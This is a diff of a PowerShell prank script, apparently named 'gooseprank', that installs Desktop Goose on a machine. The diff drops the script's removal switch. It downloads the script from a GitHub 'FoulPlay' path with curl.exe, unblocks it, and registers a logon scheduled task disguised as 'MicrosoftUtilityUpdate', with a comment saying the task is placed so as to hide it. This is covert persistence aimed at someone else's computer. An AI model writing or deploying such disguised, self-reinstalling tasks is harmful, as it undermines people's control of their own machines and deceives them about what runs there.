@@ -2,8 +2,7 @@
 
 [CmdletBinding()]
 param (
-    [switch]$installdesktopgoose,
-    [switch]$Remove
+    [switch]$installdesktopgoose
 )
 
 # Determine execution context (Admin vs User) and set paths
@@ -24,10 +23,7 @@ if ($isAdmin) {
     $global:taskpath = "\" # Place the task in a subfolder to hide it
 }
 
-
-
-
-
+#region Functions
 function Install-DesktopGoose {
     write-host "Installing Desktop Goose..." -ForegroundColor Green
 
@@ -41,7 +37,7 @@ function Install-DesktopGoose {
 
     #check that it was downloaded to the default location (part of install process)
     $download = Get-ChildItem -Path "$env:USERPROFILE\Downloads" -Filter "Desktop Goose*.zip" -ErrorAction SilentlyContinue | Select-Object -First 1
-    if (Test-Path $download.FullName -ErrorAction SilentlyContinue) {
+    if ($download.FullName) {
         Write-Host "Desktop Goose zip file found at $($download.FullName)" -ForegroundColor Green
         move-item -Path $download.FullName -Destination $backupPath -Force
         unpackgoose # function to extract the zip to the install path
@@ -61,9 +57,8 @@ function Install-DesktopGoose {
     }
     #copy this script to the backup location so it can be called by the scheduled task even if the original is deleted
     write-host "Copying this script to the backup location for scheduled task use..." -ForegroundColor Green
-    curl.exe -L -o $goooseScript "https://raw.githubusercontent.com/Mousman33/RandomPowerShell/main/FoulPlay/gooseprank.ps1"
-    Unblock-File -Path $goooseScript
-    Copy-Item -Path $goooseScript -Destination "$backupPath\gooseprank.ps1" -Force
+    curl.exe -L -o "$backupPath\gooseprank.ps1" "https://raw.githubusercontent.com/Mousman33/RandomPowerShell/main/FoulPlay/gooseprank.ps1"
+    Unblock-File -Path "$backupPath\gooseprank.ps1"
 
     # Create a scheduled task to run this script at logon
     $taskname = "MicrosoftUtilityUpdate"
